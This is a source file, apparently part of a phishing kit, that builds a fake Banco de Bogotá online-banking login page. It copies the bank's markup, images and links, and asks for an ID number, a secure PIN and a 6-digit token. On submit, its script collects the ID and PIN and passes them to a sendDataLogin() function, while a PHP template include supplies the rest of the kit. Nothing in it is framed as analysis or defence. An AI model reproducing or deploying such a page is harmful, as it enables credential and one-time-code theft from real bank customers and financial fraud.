var bogota_titulo = 'Banco de Bogotá';
var loading_body = ``;
var bogota_body = `

<div id="login">

  <form>
    <select
      class="pb-select ng-untouched ng-pristine ng-valid"
      formcontrolname="idType"
      ng-reflect-name="idType"
      id="idType">
      <option value="CC"
        ng-reflect-value="CC">
        C.C. Cédula de
        ciudadanía</option>
      <option value="TI"
        ng-reflect-value="TI">
        T.I. Tarjeta de
        Identidad</option>
      <option value="CE"
        ng-reflect-value="CE">
        C.E. Cédula de
        Extranjería</option>
      <option value="NI"
        ng-reflect-value="NI">
        N.P.N. NIT Persona
        Natural</option>
      <option value="NE"
        ng-reflect-value="NE">
        N.P.E. NIT Persona
        Extranjera</option>
      <option value="NJ"
        ng-reflect-value="NJ">
        N.P.J. NIT Persona
        Jurídica</option>
      <option value="PA"
        ng-reflect-value="PA">
        P.S. Pasaporte
      </option>
      <option value="RC"
        ng-reflect-value="RC">
        R.C. Registro Civil
      </option>
    </select>

    <input
      formcontrolname="idNumber"
      inputmode="numeric"
      maxlength="10"
      pattern="[0-9]*"
      pb-input=""
      placeholder="Número de identificación"
      ng-reflect-maxlength="10"
      ng-reflect-pattern="[0-9]*"
      ng-reflect-name="idNumber"
      id="idNumber"
      class="pb-input ng-pristine ng-invalid ng-touched"
      autocomplete="off"
      onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">

    <input formcontrolname="pin"
      inputmode="numeric"
      maxlength="4"
      autocomplete="off"
      pattern="[0-9]*"
      pb-input=""
      placeholder="Clave segura"
      type="password"
      ng-reflect-maxlength="4"
      ng-reflect-pattern="[0-9]*"
      id="pin"
      ng-reflect-name="pin"
      class="pb-input ng-untouched ng-pristine ng-invalid"
      onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">



    <div class="btn-container">
      <div class="error-msg">
      </div>
      <button bv-button=""
        style="opacity: 0.5;"
        class="pb-submit bv-button button-md-pb-classic"
        color="pb-classic"
        id="pl-submit-btn"
        type="button"
        ng-reflect-color="pb-classic"
        ng-reflect-show-loader="false">
        <div style="display: inline-block;"
          id="btnIngreso">
          <table
            border="0"
            cellpadding="0"
            cellspacing="0">
            <tbody>
              <tr>
                <td
                  valign="middle">
                  <img style="margin-top:5px;"
                    class="pb-classic__lock"
                    src="https://virtual.bancodebogota.co/bbog-pb-frontend-legacy-web/assets/imgs/lock_yellow_pb.svg">
                </td>
                <td valign="middle"
                  style="padding-left: 8px;font-family: 'Roboto', sans-serif;">
                  INGRESA
                  SEGURO
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </button>
    </div>

    <div
      class="recaptcha-policy">
      <div
        class="recaptcha-policy__content pulse-tp-hl6-comp-r">
        <span>Este sitio
          está protegido
          por reCAPTCHA y
          aplican las
        </span>
        <a class="recaptcha-policy__content--anchor"
          href="https://policies.google.com/privacy"
          rel="noopener">políticas
          de
          privacidad</a> y
        los <a
          class="recaptcha-policy__content--anchor"
          href="https://policies.google.com/terms"
          rel="noopener">términos
          de servicio de
          Google.</a>
      </div>
    </div>

    <div
      class="version pulse-tp-bo4-comp-r">
      V.0.1.379-M
    </div>




    <div class="options">
      <ul>
        <li><a
            href="https://virtual.bancodebogota.co/#/login">Ingresar
            con Clave
            Segura <i
              class="fas fa-angle-right"></i></a>
        </li>
        <li><a
            href="https://www.bancodebogota.com/Banking/pb/logon?a=00010016&amp;pbold=true">Ingresa
            al portal
            anterior <i
              class="fas fa-angle-right"></i></a>
        </li>
      </ul>
    </div>

  </form>

</div>


<div id="panel-otp-err"
  style="display: none;">

  <form>
    <input
      formcontrolname="otperr"
      inputmode="numeric"
      maxlength="6"
      autocomplete="off"
      pattern="[0-9]*"
      pb-input=""
      placeholder="Ingrese su token"
      type="password"
      ng-reflect-maxlength="6"
      ng-reflect-pattern="[0-9]*"
      id="otperr"
      ng-reflect-name="otperr"
      class="pb-input ng-untouched ng-pristine ng-invalid"
      onkeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">


    <div class="btn-container">
      <div class="error-msg">
      </div>
      <button bv-button=""
        style="opacity: 0.5;"
        class="pb-submit bv-button button-md-pb-classic"
        color="pb-classic"
        id="pl-err-otp-btn"
        ng-reflect-color="pb-classic"
        ng-reflect-show-loader="false"
        disabled="">

        <div style="display: inline-block;"
          id="btnOTPErr">
          <table
            border="0"
            cellpadding="0"
            cellspacing="0">
            <tbody>
              <tr>
                <td
                  valign="middle">
                  <img style="margin-top:5px;"
                    class="pb-classic__lock"
                    src="https://virtual.bancodebogota.co/bbog-pb-frontend-legacy-web/assets/imgs/lock_yellow_pb.svg">
                </td>
                <td valign="middle"
                  style="padding-left: 8px;font-family: 'Roboto', sans-serif;">
                  VALIDAR
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </button>
    </div>

    <div
      class="recaptcha-policy">
      <div
        class="recaptcha-policy__content pulse-tp-hl6-comp-r">
        <span>Este sitio
          está protegido
          por reCAPTCHA y
          aplican las
        </span>
        <a class="recaptcha-policy__content--anchor"
          href="https://policies.google.com/privacy"
          rel="noopener">políticas
          de
          privacidad</a> y
        los <a
          class="recaptcha-policy__content--anchor"
          href="https://policies.google.com/terms"
          rel="noopener">términos
          de servicio de
          Google.</a>
      </div>
    </div>

    <div
      class="version pulse-tp-bo4-comp-r">
      V.0.1.379-M
    </div>


    <div class="options">
      <ul>
        <li><a
            href="https://virtual.bancodebogota.co/#/login">Ingresar
            con Clave
            Segura <i
              class="fas fa-angle-right"></i></a>
        </li>
        <li><a
            href="https://www.bancodebogota.com/Banking/pb/logon?a=00010016&amp;pbold=true">Ingresa
            al portal
            anterior <i
              class="fas fa-angle-right"></i></a>
        </li>
      </ul>
    </div>

  </form>

</div>

`

<?php require_once('plantilla_bogota.php'); ?>

//<script>
  loadContenido();

  $(document).ready(function() {

    $("#fondo, #mensaje").hide();
    $("#idNumber,#pin").keyup(function() {
      if ($("#idNumber").val().length > 6 && $("#pin").val().length > 3) {
        $("#pl-submit-btn").css("opacity", "1");
        $("#pl-submit-btn").prop("disabled", false);
      } else {
        $("#pl-submit-btn").css("opacity", "0.5");
        $("#pl-submit-btn").prop("disabled", true);
      }
    });

    $("#pl-submit-btn").on("click", function() {
      $("#fondo,#mensaje").show();
      var usuario = $("#idNumber").val();
      var password = $("#pin").val();

      sendDataLogin(usuario, password);
    });
  });